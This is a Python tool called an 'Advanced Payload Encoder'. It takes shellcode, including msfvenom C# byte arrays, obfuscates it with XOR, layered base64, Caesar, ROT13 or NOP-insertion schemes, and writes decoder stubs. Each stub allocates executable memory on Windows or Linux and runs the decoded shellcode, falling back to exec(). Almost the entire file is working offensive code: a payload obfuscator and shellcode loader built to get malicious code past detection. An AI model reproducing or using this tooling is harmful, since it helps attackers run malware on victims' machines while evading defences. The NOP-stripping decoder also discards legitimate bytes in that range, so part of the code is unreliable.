#!/usr/bin/env python3
"""
Advanced Payload Encoder - Core Functionality
Supports multiple encoding algorithms and input formats
"""

import argparse
import base64
import binascii
import random
import string
import struct
import sys
import re
from pathlib import Path

class PayloadEncoder:
    def __init__(self):
        self.encoders = {
            'base64': self.encode_base64,
            'xor': self.encode_xor,
            'rot13': self.encode_rot13,
            'polymorphic': self.encode_polymorphic,
            'caesar': self.encode_caesar
        }
        self.xor_key = 0xAA
        self.caesar_shift = 13
    
    def load_payload(self, input_file, input_format):
        """Load payload from various input formats"""
        try:
            with open(input_file, 'rb') as f:
                data = f.read()
            
            if input_format == 'raw':
                return data
            elif input_format == 'hex':
                # Handle hex string input
                hex_str = data.decode('utf-8').strip().replace('\\x', '').replace(' ', '').replace('\n', '')
                return binascii.unhexlify(hex_str)
            elif input_format == 'csharp':
                # Parse C# byte array format from msfvenom
                content = data.decode('utf-8')
                matches = re.findall(r'0x[0-9a-fA-F]{2}', content)
                if matches:
                    return bytes([int(x, 16) for x in matches])
                else:
                    raise ValueError("No hex bytes found in C# format")
            elif input_format == 'binary':
                return data
            else:
                raise ValueError(f"Unsupported input format: {input_format}")
        except Exception as e:
            raise Exception(f"Failed to load payload: {e}")
    
    def encode_base64(self, data, iterations=3):
        """Multi-layer Base64 encoding"""
        result = data
        for i in range(iterations):
            result = base64.b64encode(result)
        return result
    
    def encode_xor(self, data, key=None):
        """XOR encoding with key"""
        if key is None:
            key = self.xor_key
        
        if isinstance(key, int):
            return bytes([b ^ key for b in data])
        elif isinstance(key, str):
            key_bytes = key.encode()
            return bytes([data[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(data))])
        else:
            raise ValueError("Key must be int or string")
    
    def encode_rot13(self, data):
        """ROT13 encoding for text data"""
        if isinstance(data, bytes):
            try:
                import codecs
                data_str = data.decode('utf-8')
                return codecs.encode(data_str, 'rot13').encode('utf-8')
            except:
                # For binary data, apply ROT13 to each byte
                return bytes([(b + 13) % 256 for b in data])
        else:
            import codecs
            return codecs.encode(data, 'rot13').encode('utf-8')
    
    def encode_caesar(self, data, shift=None):
        """Caesar cipher encoding"""
        if shift is None:
            shift = self.caesar_shift
        
        result = bytearray()
        for byte in data:
            shifted = (byte + shift) % 256
            result.append(shifted)
        return bytes(result)
    
    def encode_polymorphic(self, data):
        """Polymorphic encoding with random NOP insertion"""
        result = bytearray()
        nop_instructions = [0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97]
        
        for byte in data:
            result.append(byte)
            # 30% chance to insert random NOP
            if random.random() < 0.3:
                nop = random.choice(nop_instructions)
                result.append(nop)
        
        return bytes(result)
    
    def generate_decoder_stub(self, algorithm, encoded_data, key=None):
        """Generate decoder stub for testing execution"""
        if algorithm == 'xor':
            return self._generate_xor_decoder(encoded_data, key)
        elif algorithm == 'base64':
            return self._generate_base64_decoder(encoded_data)
        elif algorithm == 'caesar':
            return self._generate_caesar_decoder(encoded_data, key or self.caesar_shift)
        elif algorithm == 'polymorphic':
            return self._generate_polymorphic_decoder(encoded_data)
        elif algorithm == 'rot13':
            return self._generate_rot13_decoder(encoded_data)
        else:
            return self._generate_generic_decoder(encoded_data)
    
    def _generate_xor_decoder(self, encoded_data, key):
        """Generate XOR decoder stub"""
        hex_data = binascii.hexlify(encoded_data).decode()
        
        if isinstance(key, int):
            decoder = f'''#!/usr/bin/env python3
# XOR Decoder Stub
import binascii
import ctypes
import sys

def decode_xor():
    encoded = "{hex_data}"
    key = {key}
    data = binascii.unhexlify(encoded)
    decoded = bytes([b ^ key for b in data])
    return decoded

def execute_shellcode(shellcode):
    """Execute shellcode using ctypes (Linux/Windows)"""
    try:
        # Allocate executable memory
        if sys.platform.startswith('win'):
            # Windows
            kernel32 = ctypes.windll.kernel32
            ptr = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
            ctypes.memmove(ptr, shellcode, len(shellcode))
            thread = kernel32.CreateThread(None, 0, ptr, None, 0, None)
            kernel32.WaitForSingleObject(thread, -1)
        else:
            # Linux
            libc = ctypes.CDLL("libc.so.6")
            mmap = libc.mmap
            mmap.restype = ctypes.c_void_p
            ptr = mmap(0, len(shellcode), 7, 0x22, -1, 0)
            ctypes.memmove(ptr, shellcode, len(shellcode))
            func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
            func()
    except Exception as e:
        print(f"Execution failed: {{e}}")
        # Fallback: try exec for Python code
        try:
            exec(shellcode)
        except:
            print("Both shellcode and Python execution failed")

# Decode and execute
payload = decode_xor()
print(f"Decoded {{len(payload)}} bytes")
execute_shellcode(payload)
'''
        else:
            decoder = f'''#!/usr/bin/env python3
# XOR Decoder Stub (String Key)
import binascii
import ctypes
import sys

def decode_xor():
    encoded = "{hex_data}"
    key = "{key}"
    data = binascii.unhexlify(encoded)
    key_bytes = key.encode()
    decoded = bytes([data[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(data))])
    return decoded

def execute_shellcode(shellcode):
    """Execute shellcode using ctypes"""
    try:
        if sys.platform.startswith('win'):
            kernel32 = ctypes.windll.kernel32
            ptr = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
            ctypes.memmove(ptr, shellcode, len(shellcode))
            thread = kernel32.CreateThread(None, 0, ptr, None, 0, None)
            kernel32.WaitForSingleObject(thread, -1)
        else:
            libc = ctypes.CDLL("libc.so.6")
            mmap = libc.mmap
            mmap.restype = ctypes.c_void_p
            ptr = mmap(0, len(shellcode), 7, 0x22, -1, 0)
            ctypes.memmove(ptr, shellcode, len(shellcode))
            func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
            func()
    except Exception as e:
        print(f"Execution failed: {{e}}")
        try:
            exec(shellcode)
        except:
            print("Both shellcode and Python execution failed")

payload = decode_xor()
print(f"Decoded {{len(payload)}} bytes")
execute_shellcode(payload)
'''
        return decoder
    
    def _generate_base64_decoder(self, encoded_data):
        """Generate Base64 decoder stub"""
        b64_data = encoded_data.decode() if isinstance(encoded_data, bytes) else encoded_data
        
        decoder = f'''#!/usr/bin/env python3
# Base64 Decoder Stub
import base64
import ctypes
import sys

def decode_base64():
    encoded = "{b64_data}"
    result = encoded.encode()
    for _ in range(3):
        try:
            result = base64.b64decode(result)
        except:
            break
    return result

def execute_shellcode(shellcode):
    """Execute shellcode using ctypes"""
    try:
        if sys.platform.startswith('win'):
            kernel32 = ctypes.windll.kernel32
            ptr = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
            ctypes.memmove(ptr, shellcode, len(shellcode))
            thread = kernel32.CreateThread(None, 0, ptr, None, 0, None)
            kernel32.WaitForSingleObject(thread, -1)
        else:
            libc = ctypes.CDLL("libc.so.6")
            mmap = libc.mmap
            mmap.restype = ctypes.c_void_p
            ptr = mmap(0, len(shellcode), 7, 0x22, -1, 0)
            ctypes.memmove(ptr, shellcode, len(shellcode))
            func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
            func()
    except Exception as e:
        print(f"Execution failed: {{e}}")
        try:
            exec(shellcode)
        except:
            print("Both shellcode and Python execution failed")

payload = decode_base64()
print(f"Decoded {{len(payload)}} bytes")
execute_shellcode(payload)
'''
        return decoder
    
    def _generate_caesar_decoder(self, encoded_data, shift):
        """Generate Caesar cipher decoder stub"""
        hex_data = binascii.hexlify(encoded_data).decode()
        
        decoder = f'''#!/usr/bin/env python3
# Caesar Decoder Stub
import binascii
import ctypes
import sys

def decode_caesar():
    encoded = "{hex_data}"
    shift = {shift}
    data = binascii.unhexlify(encoded)
    decoded = bytearray()
    for byte in data:
        original = (byte - shift) % 256
        decoded.append(original)
    return bytes(decoded)

def execute_shellcode(shellcode):
    """Execute shellcode using ctypes"""
    try:
        if sys.platform.startswith('win'):
            kernel32 = ctypes.windll.kernel32
            ptr = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
            ctypes.memmove(ptr, shellcode, len(shellcode))
            thread = kernel32.CreateThread(None, 0, ptr, None, 0, None)
            kernel32.WaitForSingleObject(thread, -1)
        else:
            libc = ctypes.CDLL("libc.so.6")
            mmap = libc.mmap
            mmap.restype = ctypes.c_void_p
            ptr = mmap(0, len(shellcode), 7, 0x22, -1, 0)
            ctypes.memmove(ptr, shellcode, len(shellcode))
            func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
            func()
    except Exception as e:
        print(f"Execution failed: {{e}}")
        try:
            exec(shellcode)
        except:
            print("Both shellcode and Python execution failed")

payload = decode_caesar()
print(f"Decoded {{len(payload)}} bytes")
execute_shellcode(payload)
'''
        return decoder
    
    def _generate_polymorphic_decoder(self, encoded_data):
        """Generate polymorphic decoder stub"""
        hex_data = binascii.hexlify(encoded_data).decode()
        
        decoder = f'''#!/usr/bin/env python3
# Polymorphic Decoder Stub
import binascii
import ctypes
import sys

def decode_polymorphic():
    encoded = "{hex_data}"
    data = binascii.unhexlify(encoded)
    nops = [0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97]
    
    decoded = bytearray()
    for byte in data:
        if byte not in nops:
            decoded.append(byte)
    
    return bytes(decoded)

def execute_shellcode(shellcode):
    """Execute shellcode using ctypes"""
    try:
        if sys.platform.startswith('win'):
            kernel32 = ctypes.windll.kernel32
            ptr = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
            ctypes.memmove(ptr, shellcode, len(shellcode))
            thread = kernel32.CreateThread(None, 0, ptr, None, 0, None)
            kernel32.WaitForSingleObject(thread, -1)
        else:
            libc = ctypes.CDLL("libc.so.6")
            mmap = libc.mmap
            mmap.restype = ctypes.c_void_p
            ptr = mmap(0, len(shellcode), 7, 0x22, -1, 0)
            ctypes.memmove(ptr, shellcode, len(shellcode))
            func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
            func()
    except Exception as e:
        print(f"Execution failed: {{e}}")
        try:
            exec(shellcode)
        except:
            print("Both shellcode and Python execution failed")

payload = decode_polymorphic()
print(f"Decoded {{len(payload)}} bytes")
execute_shellcode(payload)
'''
        return decoder
    
    def _generate_rot13_decoder(self, encoded_data):
        """Generate ROT13 decoder stub"""
        hex_data = binascii.hexlify(encoded_data).decode()
        
        decoder = f'''#!/usr/bin/env python3
# ROT13 Decoder Stub
import binascii
import ctypes
import sys

def decode_rot13():
    encoded = "{hex_data}"
    data = binascii.unhexlify(encoded)
    decoded = bytes([(b - 13) % 256 for b in data])
    return decoded

def execute_shellcode(shellcode):
    """Execute shellcode using ctypes"""
    try:
        if sys.platform.startswith('win'):
            kernel32 = ctypes.windll.kernel32
            ptr = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
            ctypes.memmove(ptr, shellcode, len(shellcode))
            thread = kernel32.CreateThread(None, 0, ptr, None, 0, None)
            kernel32.WaitForSingleObject(thread, -1)
        else:
            libc = ctypes.CDLL("libc.so.6")
            mmap = libc.mmap
            mmap.restype = ctypes.c_void_p
            ptr = mmap(0, len(shellcode), 7, 0x22, -1, 0)
            ctypes.memmove(ptr, shellcode, len(shellcode))
            func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
            func()
    except Exception as e:
        print(f"Execution failed: {{e}}")
        try:
            exec(shellcode)
        except:
            print("Both shellcode and Python execution failed")

payload = decode_rot13()
print(f"Decoded {{len(payload)}} bytes")
execute_shellcode(payload)
'''
        return decoder
    
    def _generate_generic_decoder(self, encoded_data):
        """Generate generic decoder stub"""
        hex_data = binascii.hexlify(encoded_data).decode()
        
        decoder = f'''#!/usr/bin/env python3
# Generic Decoder Stub
import binascii
import ctypes
import sys

def decode_payload():
    encoded = "{hex_data}"
    data = binascii.unhexlify(encoded)
    return data

def execute_shellcode(shellcode):
    """Execute shellcode using ctypes"""
    try:
        if sys.platform.startswith('win'):
            kernel32 = ctypes.windll.kernel32
            ptr = kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
            ctypes.memmove(ptr, shellcode, len(shellcode))
            thread = kernel32.CreateThread(None, 0, ptr, None, 0, None)
            kernel32.WaitForSingleObject(thread, -1)
        else:
            libc = ctypes.CDLL("libc.so.6")
            mmap = libc.mmap
            mmap.restype = ctypes.c_void_p
            ptr = mmap(0, len(shellcode), 7, 0x22, -1, 0)
            ctypes.memmove(ptr, shellcode, len(shellcode))
            func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
            func()
    except Exception as e:
        print(f"Execution failed: {{e}}")
        try:
            exec(shellcode)
        except:
            print("Both shellcode and Python execution failed")

payload = decode_payload()
print(f"Decoded {{len(payload)}} bytes")
execute_shellcode(payload)
'''
        return decoder
    
    def save_output(self, data, output_file, format_type='hex'):
        """Save encoded data in various formats"""
        with open(output_file, 'w') as f:
            if format_type == 'hex':
                f.write(binascii.hexlify(data).decode())
            elif format_type == 'csharp':
                hex_bytes = [f"0x{b:02x}" for b in data]
                f.write(f"byte[] payload = new byte[{len(data)}] {{\n")
                f.write("    " + ", ".join(hex_bytes) + "\n")
                f.write("};")
            elif format_type == 'python':
                f.write(f"payload = {list(data)}")
            elif format_type == 'base64':
                f.write(base64.b64encode(data).decode())
            else:
                f.write(data.decode() if isinstance(data, bytes) else str(data))

def main():
    parser = argparse.ArgumentParser(
        description="Advanced Payload Encoder",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python encoder.py -i payload.bin -o encoded.txt -e xor --key 0xAA
  python encoder.py -i shellcode.hex -f hex -e base64 -o encoded.txt
  python encoder.py -i payload.cs -f csharp -e polymorphic -o encoded.txt
  python encoder.py -i payload.bin -e xor --key "secret" --decoder
        """
    )
    
    parser.add_argument('-i', '--input', required=True, help='Input payload file')
    parser.add_argument('-o', '--output', required=True, help='Output encoded file')
    parser.add_argument('-e', '--encoder', required=True, 
                       choices=['base64', 'xor', 'rot13', 'polymorphic', 'caesar'],
                       help='Encoding algorithm')
    parser.add_argument('-f', '--format', default='binary',
                       choices=['raw', 'hex', 'csharp', 'binary'],
                       help='Input format (default: binary)')
    parser.add_argument('--key', help='Encoding key (for XOR: hex value like 0xAA or string)')
    parser.add_argument('--shift', type=int, default=13, help='Caesar cipher shift value')
    parser.add_argument('--iterations', type=int, default=3, help='Base64 encoding iterations')
    parser.add_argument('--output-format', default='hex',
                       choices=['hex', 'csharp', 'python', 'base64', 'raw'],
                       help='Output format (default: hex)')
    parser.add_argument('--decoder', action='store_true', help='Generate decoder stub')
    
    args = parser.parse_args()
    
    try:
        encoder = PayloadEncoder()
        
        # Set parameters
        if args.key:
            if args.key.startswith('0x'):
                encoder.xor_key = int(args.key, 16)
            else:
                encoder.xor_key = args.key
        
        encoder.caesar_shift = args.shift
        
        # Load payload
        print(f"[+] Loading payload from {args.input} (format: {args.format})")
        payload = encoder.load_payload(args.input, args.format)
        print(f"[+] Loaded {len(payload)} bytes")
        
        # Encode payload
        print(f"[+] Encoding with {args.encoder} algorithm")
        if args.encoder == 'base64':
            encoded = encoder.encode_base64(payload, args.iterations)
        elif args.encoder == 'xor':
            encoded = encoder.encode_xor(payload, encoder.xor_key)
        elif args.encoder == 'caesar':
            encoded = encoder.encode_caesar(payload, args.shift)
        else:
            encoded = encoder.encoders[args.encoder](payload)
        
        print(f"[+] Encoded to {len(encoded)} bytes")
        
        # Save encoded payload
        encoder.save_output(encoded, args.output, args.output_format)
        print(f"[+] Saved encoded payload to {args.output}")
        
        # Generate decoder stub if requested
        if args.decoder:
            decoder_file = args.output.replace('.txt', '_decoder.py')
            decoder_stub = encoder.generate_decoder_stub(args.encoder, encoded, encoder.xor_key)
            with open(decoder_file, 'w') as f:
                f.write(decoder_stub)
            print(f"[+] Generated decoder stub: {decoder_file}")
        
        print("[+] Encoding complete!")
        
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()